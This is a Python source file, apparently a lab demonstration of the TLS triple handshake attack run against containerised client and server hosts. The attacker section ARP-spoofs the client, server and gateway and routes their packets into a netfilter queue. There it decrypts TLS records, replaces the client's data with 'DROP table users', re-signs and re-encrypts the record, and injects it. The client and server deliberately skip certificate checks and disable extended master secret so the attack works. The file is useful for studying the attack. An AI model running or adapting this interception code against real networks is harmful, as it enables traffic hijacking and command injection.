                        # tls version (0x0302 for tls 1.1)
                        # 2 bytes plaintext length (16 for the temp_pre_encryption bytestring)
                        # plaintext (temp_pre_encryption)
                        intermediary_plaintext = b'\x00' * 8 + b'\x16' + b'\x03\x02' + b'\x00\x10' + temp_pre_encryption

                        from cryptography.hazmat.primitives import hashes, hmac

                        h = hmac.HMAC(server_write_MAC_secret, hashes.SHA1())
                        h.update(intermediary_plaintext)
                        signature = h.finalize()  # MAC[CipherSpec.hash_size] = MAC[20 BYTES]
                        print(b"Signature: " + signature)

                        # RECIPE FOR GenericBlockCipher
                        # IV [16 bytes]
                        # content (intermediary_plaintext) [16 bytes]
                        # MAC [20 bytes]
                        # padding (must be a multiple of 16 bytes, the block length of our AES256 cipher, so with 53 as the sum of IV, content and MAC and padding length, we need 11 padding bytes, and the padding bytes will be b'0x0B')
                        # padding length 1
                        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

                        cipher = Cipher(algorithms.AES256(server_write_key), modes.CBC(server_write_IV))
                        encryptor = cipher.encryptor()
                        plaintext = temp_pre_encryption + signature  # only these two as the plaintext, choose a random IV and prepend it after you encrypt this plaintext...

                        padding_length = 16 - (len(plaintext) % 16)
                        if padding_length == 0:
                            padding_length = 16
                        padding = (chr(padding_length - 1) * padding_length).encode()

                        plaintext += padding

                        print(b"plaintext: " + plaintext)
                        print("padded plaintext length: " + str(len(plaintext)))

                        ct = encryptor.update(plaintext) + encryptor.finalize()

                        # final payload will be IV and ct concatenated!
                        # according to section 6.2.3.2 of RFC 4346 and my tests, i found out that IV gets prepended to the ciphertext, before
                        # getting sent... there is even another option, which is to set the "cipher" IV to 0 and encrypt "our" IV by prepending it to the ciphertext, like the
                        # one calculated in the KDF, as the FIRST block, then just send the ciphertext (WITHOUT PREPENDING THE "cipher" IV to the ciphertext) (option 2.a page 22 rfc 4346)
                        # In either way, it seems that the tlslite-ng implementation uses the first option and generates the IV separately
                        # for each Record, as per point 1 of page 22 of RFC 4346 (look session.py "derive_keys" of that library!)...
                        ct = server_write_IV + ct  # prepend the "random" IV... who cares if we don't generate it as per RFC... WE'RE THE ATTACKERS!

                        print(b"Ciphertext: " + ct)
                        print("Ciphertext length: " + str(len(ct)))

                        print(scpy_pkt.show2())

                        final_packet_after_manual_insertion = IP(bytes(scpy_pkt)[0:-(len(ct))] + ct)

                        del final_packet_after_manual_insertion["TCP"].chksum
                        del final_packet_after_manual_insertion["IP"].chksum
                        del final_packet_after_manual_insertion["IP"].len
                        print(final_packet_after_manual_insertion.show2())

                        pkt.set_payload(bytes(final_packet_after_manual_insertion))
                        pkt.accept()

                        handshake_mangled = True
                        return

                    else:
                        print(
                            "Check if this message was the last unknown, in that case this is an encrypted server finished message...")
                        print("Unknown TLS layer type encountered before change cipher spec...")
                        if not change_cipher_spec_encountered:
                            print("Still, we are saving it inside the concatenation...")

                            # for the server finished message we take the TLS record's content BEFORE changing them
                            server_finished_concatenation += get_handshake_message_bytes(generic_tls_layer)
                            print(f"(server concat)generic tls layer {i} length: " + str(
                                len(get_handshake_message_bytes(generic_tls_layer))))


                        print("TLS client finished message captured? check if the numbers are the same")
                        print(
                            f"Calculated tls record number: {i}; Actual tls record number: {tls_record_of_finished_message}")

            pkt.accept()
        else:
            # handshake was done, as a demonstration mangle the first data packet and show that server receives the mangled version...
            # instead of crafting a new one from ground up (in the end, to show mangling was successfull it is better to do that)
            #todo: maybe write both versions and let a switch decide?

            if scpy_pkt.haslayer(TLSApplicationData):

                if not applicationdata_mangled:

                    iv = (bytes(scpy_pkt)[-64:])[
                        0:16]  # take the first 16 bytes of the encrypted payload, that's the IV used by the real client to encrypt the message...
                    print(b"iv used by the client: " + iv)
                    print("iv used by the client (hex): " + iv.hex())

                    cipher_decrypt = CipherBase(AES256(client_write_key), CBC(iv))
                    decryptor = cipher_decrypt.decryptor()
                    decrypted_client_message = decryptor.update((bytes(scpy_pkt)[-64:])) + decryptor.finalize()
                    print("Decrypted client message (hex): " + decrypted_client_message.hex())
                    length_of_plaintext_message = len(decrypted_client_message) - 20 - decrypted_client_message[-1] - 16 - 1 # - sha 1 mac - padding - IV - padding length byte (each size is in in byte)
                                                                                                                             # i can take the padding length by simply reading one byte from the padding, since that's what the bytes of the padding are made of...
                                                                                                                             # the padding length byte is just 1 byte, and contains the length of the padding...
                                                                                                                             # so yeah, in total you got 1 byte for padding length and padding_length bytes of padding length.
                    print("Decrypted client message length: " + str(length_of_plaintext_message))
                    print(b"Decrypted client message (only human readable): " + decrypted_client_message[16:(16+length_of_plaintext_message)])

                    # application data record to be encrypted, just the data and some 0x00 byte padding...
                    temp_pre_encryption = b'DROP table users' + (b'\x00'*(length_of_plaintext_message - len(b'DROP table users')))
                    real_length = len(temp_pre_encryption) # recalculate the length now that you added padding...

                    print("final plaintext" + str(temp_pre_encryption))
                    print("final plaintext message length: " + str(real_length))
                    # LET'S ENCRYPT!
                    print(b"payload: " + temp_pre_encryption)

                    # RECIPE FOR THE MAC!
                    # sequence number at 1 for the first application data message (8 bytes) (this is the first for the server "end"!!!!)
                    # 1 byte content type at 0x17 (23) for application data messages
                    # tls version (0x0302 for tls 1.1)
                    # 2 bytes plaintext length (16 for the temp_pre_encryption bytestring)
                    # plaintext (temp_pre_encryption)
                    intermediary_plaintext = b'\x00' * 7 + b'\x01' + b'\x17' + b'\x03\x02' + real_length.to_bytes(2) + temp_pre_encryption

                    print("intermediary_plaintext" + str(intermediary_plaintext))
                    print("intermediary_plaintext message length: " + str(len(intermediary_plaintext)))
                    print("intermediary_plaintext message hex: " + intermediary_plaintext.hex())
                    from cryptography.hazmat.primitives import hashes, hmac

                    h = hmac.HMAC(client_write_MAC_secret, hashes.SHA1())
                    h.update(intermediary_plaintext)
                    signature = h.finalize()  # MAC[CipherSpec.hash_size] = MAC[20 BYTES]
                    print(b"Signature: " + signature)

                    # RECIPE FOR GenericBlockCipher
                    # IV [16 bytes] ( this one goes out of the ciphertext, what comes next is instead encrypted for real!)
                    # content (intermediary_plaintext) [16 bytes]
                    # MAC [20 bytes]
                    # padding (must be a multiple of 16 bytes, the block length of our AES256 cipher, so with 53 as the sum of IV, content and MAC and padding length, we need 11 padding bytes, and the padding bytes will be b'0x0B')
                    # padding length 1
                    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

                    cipher = Cipher(algorithms.AES256(client_write_key), modes.CBC(client_write_IV))
                    encryptor = cipher.encryptor()
                    plaintext = temp_pre_encryption + signature  # only these two as the plaintext, choose a random IV and prepend it after you encrypt this plaintext...

                    padding_length = 16 - (len(plaintext) % 16)
                    if padding_length == 0:
                        padding_length = 16
                    padding = (chr(padding_length - 1) * padding_length).encode()

                    plaintext += padding

                    print(b"plaintext: " + plaintext)
                    print("padded plaintext length: " + str(len(plaintext)))

                    ct = encryptor.update(plaintext) + encryptor.finalize()

                    # final payload will be IV and ct concatenated!
                    # according to section 6.2.3.2 of RFC 4346 and my tests, i found out that IV gets prepended to the ciphertext, before
                    # getting sent... there is even another option, which is to set the "cipher" IV to 0 and encrypt "our" IV by prepending it to the ciphertext, like the
                    # one calculated in the KDF, as the FIRST block, then just send the ciphertext (WITHOUT PREPENDING THE "cipher" IV to the ciphertext) (option 2.a page 22 rfc 4346)
                    # In either way, it seems that the tlslite-ng implementation uses the first option and generates the IV separately
                    # for each Record, as per point 1 of page 22 of RFC 4346 (look session.py "derive_keys" of that library!)...
                    ct = client_write_IV + ct  # prepend the "random" IV... who cares if we don't generate it as per RFC... WE'RE THE ATTACKERS!

                    print(b"Ciphertext: " + ct)
                    print("Ciphertext length: " + str(len(ct)))

                    print(scpy_pkt.show2())

                    final_packet_after_manual_insertion = IP(bytes(scpy_pkt)[0:-(len(ct))] + ct)

                    del final_packet_after_manual_insertion["TCP"].chksum
                    del final_packet_after_manual_insertion["IP"].chksum
                    del final_packet_after_manual_insertion["IP"].len
                    print(final_packet_after_manual_insertion.show2())

                    pkt.set_payload(bytes(final_packet_after_manual_insertion))
                    #
                    # rst_packet_for_server = IP(dst="172.18.0.3", src="172.18.0.2")/TCP(dport=scpy_pkt[TCP].dport, sport=scpy_pkt[TCP].sport, flags='F', seq=final_packet_after_manual_insertion[TCP].seq + 1, ack=final_packet_after_manual_insertion[TCP].ack)
                    # rst_packet_for_client = IP(dst="172.18.0.2", src="172.18.0.3")/TCP(dport=scpy_pkt[TCP].sport, sport=scpy_pkt[TCP].dport, flags='F', seq=final_packet_after_manual_insertion[TCP].ack + 1, ack=final_packet_after_manual_insertion[TCP].seq)
                    #
                    # rst_packet_for_client.show2()
                    # rst_packet_for_server.show2()
                    #
                    # send(rst_packet_for_server)
                    # send(rst_packet_for_client)

                    applicationdata_mangled  = True


            pkt.accept()


    else:

        pkt.accept()




# just a static variable inside the handler queue 1 function, to keep track of the number of packets received...
handler_queue_1.pktnum = 0

def check_internet_connection():
    conn = http.client.HTTPSConnection("8.8.8.8", timeout=5)
    try:
        conn.request("HEAD", "/")
        return "Connected to Internet!"
    except Exception:
        return "no connection!"
    finally:
        conn.close()

def print_hi(name):
    # Use a breakpoint in the code line below to debug your script.
    print(f"Hi, {name}, i'm {socket.gethostname()} and you can find me at {socket.gethostbyname(socket.gethostname())}")  # Press Ctrl+F8 to toggle the breakpoint.
    print("Public ip address: ", check_internet_connection())

# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    print_hi('PyCharm')

    if socket.gethostname() == "client":
        # try to connect via tls to server after 10s...
        print("client connected...")
        p = subprocess.Popen(["ping", "172.18.0.3"])

        sleep(10) # let the arppoison have effect, we'd normally run it for quite some time irl...
        sleep(5) # give some time to the server for setup, before trying to connect...
        #step 1. create a TCP socket and connect to the server...
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.connect(("172.18.0.3", 443))
        #step 2. construct a TLSConnection
        conn = tlslite.TLSConnection(sock)
        #step 3. call a handshake function (client).
        #        We insert voluntarily a bug here, which is to not check the server's certificate, much like what happens with
        #        old router's control panels: they have https with tls, but their certificate is not installed in the machine.
        #        THe bug is to not insert a checker object in the list of arguments to handshakeclientcert.
        x509 = X509()
        with open("/app/client_certificate.pem") as s:
            x509.parse(s.read())
        chain = X509CertChain([x509])

        with open("/app/RSA_key_client_client.pem") as s:
            private_key = parsePEMKey(s.read(), private=True)

        with open("/app/server_certificate.pem") as s:
            server_certificate = X509().parse(s.read())

        print(server_certificate.sigalg)
        print(server_certificate)
        settings = HandshakeSettings()
        settings.cipherNames=["aes256gcm", "aes256"]
        settings.maxVersion = TLS_VERSION
        settings.keyExchangeNames = ["rsa", "dhe_rsa"]
        settings.useEncryptThenMAC = False
        settings.useExtendedMasterSecret = False # VERYYYYYY IMPORTANT!!!!!!!!!!!!!!!!!!!!! The triple handshake attack doesn't work if this is ON!!!
                                                  #section 4 RFC 7627
        try:
            oldSession = Session()

            conn.handshakeClientCert(chain,
                                     private_key,
                                     serverName="server",
                                     session=oldSession,
                                     settings=settings#,
                                     # checker= Checker(x509Fingerprint=server_certificate.getFingerprint())
                                     )  # we pass the client certificate and private key to the function, even if the server will not (initially, phase 1) ask for it.
            print("Handshake done")
            oldSession = conn.session # remember to always save the old session...
            error_last_connection = False
            i = 0
            while True:
                if conn.closed or error_last_connection or i == 3: #retry to connect with session resumption...
                    try:
                        print(" Is session valid? " + str(oldSession.valid()))
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # previous socket was closed, reopen a new one...
                        sock.settimeout(5)
                        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                        sock.connect(("172.18.0.3", 443))
                        conn = tlslite.TLSConnection(sock)
                        conn.handshakeClientCert(chain,
                                                 private_key,
                                                 serverName="server",
                                                 session=oldSession,
                                                 settings=settings)
                        oldSession = conn.session # remember to always save the old session...
                        error_last_connection = False
                    except Exception as e:
                        print(e)
                try:
                    conn.sendall(b"SELECT * FROM tb")# when connected, just send this innocuous command...

                    i += 1

                except Exception as e:
                    error_last_connection = True
                    print(e) # just get the connection closed exception or broken pipe...

                sleep(5)



        except Exception as e:
            print(e)
        finally:
            conn.close()

        p.kill()
    elif socket.gethostname() == "server":
        # listen to a socket...
        print("server connected...")

        sleep(10) # let the arppoison have effect, we'd normally run it for quite some time irl...
        # step 1. create a TCP socket and connect to the server...
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # step 1s. bind the socket to our address (SERVER) and port, and start listening...
        sock.bind(("172.18.0.3", 443))
        sock.listen(1)
        real_sock, client_address = sock.accept() # accept returns a new socket object, representing the newly socket connected to the client! The old one continues to listen for new connections...
        real_sock.settimeout(20)
        print(f"connected to {client_address}")


        # step 2. construct a TLSConnection
        conn = tlslite.TLSConnection(real_sock)
        # step 3. call a handshake function (server).
        #        We insert voluntarily a bug here, which is to not check the client's certificate from the start
        s = open("/app/server_certificate.pem").read()
        x509 = X509()
        x509.parse(s)
        chain = X509CertChain([x509])

        s = open("/app/RSA_key_server_server.pem").read()
        private_key = parsePEMKey(s, private=True)


        with open("/app/client_certificate.pem") as s:
            client_certificate = X509().parse(s.read())

        settings = HandshakeSettings()
        settings.maxVersion = TLS_VERSION
        settings.cipherNames=["aes256gcm", "aes256"]
        settings.keyExchangeNames = ["rsa", "dhe_rsa"]
        settings.useEncryptThenMAC = False
        settings.useExtendedMasterSecret = False  # VERYYYYYY IMPORTANT!!!!!!!!!!!!!!!!!!!!! The triple handshake attack doesn't work if this is ON!!!
                                                  # section 4 RFC 7627
        # session cache active, so we can resume laster
        sessionCache = SessionCache()

        auth_needed = False
        try:
            conn.handshakeServer(certChain=chain,
                                 privateKey=private_key,
                                 settings=settings,
                                 sessionCache=sessionCache,
                                 #checker=Checker(client_certificate.getFingerprint()),
                                 reqCert=False or auth_needed)  # we pass the server certificate and private key to the function
            print("Handshake done")
            msg = None
            while True:

                if auth_needed:

                    try:
                        # step 2. construct a TLSConnection
                        real_sock, client_address = sock.accept()  # accept returns a new socket object, representing the newly socket connected to the client! The old one continues to listen for new connections...
                        real_sock.settimeout(20)

                        conn = tlslite.TLSConnection(real_sock)
                        conn.handshakeServer(certChain=chain,
                                             privateKey=private_key,
                                             settings=settings,
                                             sessionCache=sessionCache,
                                             checker=Checker(client_certificate.getFingerprint()),
                                             reqCert=True)  # we pass the server certificate and private key to the function
                        print(b"Client authed and executed this command : " + msg)
                        auth_needed = False
                    except Exception as e:
                        print(e)

                else:
                    msg = conn.recv(1024)
                    print(msg)

                    if b"DROP table" in msg:
                        print("Received unauthenticated DROP command... proceeding to auth...")
                        auth_needed = True # i could implement a drop in the attacker, but to speed things up and not wait for the timeout of the TLS session, let's just make the server close the connection altogether for this demo...
                        continue


        except Exception as e:
            print(e)
        finally:
            conn.close()
            sock.close()


    else:

        print("attacker online...")

        load_layer("tls")

        with open("/dev/null", "wb") as fnull:
            # attacker
            # run arpspoof ASAP
            # p = subprocess.Popen(["ifconfig", "-a"], stdout=1, stderr=1) # use this line or open a terminal to check the interface name, should be eth0
            p = list()
            print("starting arpspoofing...")
            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.1", "172.18.0.2"], stdout=fnull, stderr=fnull)) # tell the gateway i'm the client
            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.2", "172.18.0.1"], stdout=fnull, stderr=fnull)) # tell the client i'm the gateway
            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.1", "172.18.0.3"], stdout=fnull, stderr=fnull)) # tell the gateway i'm the server
            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.3", "172.18.0.1"], stdout=fnull, stderr=fnull)) # tell the server i'm the gateway
            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.3", "172.18.0.2"], stdout=fnull, stderr=fnull)) # tell the server i'm the client
            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.2", "172.18.0.3"], stdout=fnull, stderr=fnull)) # tell the client i'm the server
            # subprocess.Popen(["sysctl", "-w" ,"net.ipv4.ip_forward=1"]) # enable port forwarding for intercepted packets... already active and can't modify it since file system is read only.
            print("arpspoofing started.")
            #The iptables chain of interest is FORWARD, since those packets are not destined to us (172.18.0.4), but to OTHER IPs!!!
            #In fact, iptables works at the TCP/IP level (layer 3 and 4), so even if frames (layer 2, ethernet) are directed to us
            # (and according to intuitition our chain of interest would be INPUT), they are still at layer 2!!!!!!
            # And so, IPTABLES, which starts to look into network packets ONLY at layer 3 (IP), THOSE PACKETS ARE NOT DIRECTED TO US AND SO DO NOT PERTAIN TO THE INPUT CHAIN.
            # why this comment? Well, to spare you some time debugging this code!

            print("creating iptables netfilter rules for victim and server...")
            # must capture every packet destined to the server coming from the client, ...
            p.append(subprocess.Popen(
                ["iptables", "-I", "FORWARD", "-s", "172.18.0.2", "-d", "172.18.0.3", "-j", "NFQUEUE", "--queue-num", "1"]))
            #and every packet destined to the client coming from the server...
            p.append(subprocess.Popen(
                ["iptables", "-I", "FORWARD", "-s", "172.18.0.3", "-d", "172.18.0.2",  "-j", "NFQUEUE", "--queue-num","1"]))
            # as they come, they will be ordered in the queue (remember, queues are FIFOs!)
            print("firewall rules created.")

            print("Binding netfilterqueue socket...")
            nfqueue = NetfilterQueue()
            nfqueue.bind(1, handler_queue_1)

            s = socket.fromfd(nfqueue.get_fd(), socket.AF_UNIX, socket.SOCK_STREAM)
            print("Binded.")

            print("Waiting for packets...")
            try:
                nfqueue.run_socket(s)
            except KeyboardInterrupt:
                print('')
            finally:
                s.close()
                nfqueue.unbind()

            for proc in p:
                proc.kill()

# See PyCharm help at https://www.jetbrains.com/help/pycharm/
